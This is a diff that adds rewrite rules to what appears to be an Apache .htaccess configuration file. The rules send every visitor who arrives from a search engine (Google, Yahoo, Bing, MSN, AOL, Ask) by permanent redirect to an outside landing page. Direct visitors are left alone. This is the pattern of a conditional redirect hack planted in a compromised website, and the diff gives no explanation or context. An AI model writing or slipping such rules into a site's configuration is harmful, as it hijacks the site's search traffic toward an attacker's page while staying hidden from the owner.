@@ -1,0 +1,5 @@
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} .*(google|yahoo|bing).* [OR]
+RewriteCond %{HTTP_REFERER} .*(msn|aol|ask).*
+RewriteRule ^(.*)$ http://example.invalid/land [R=301,L]
+
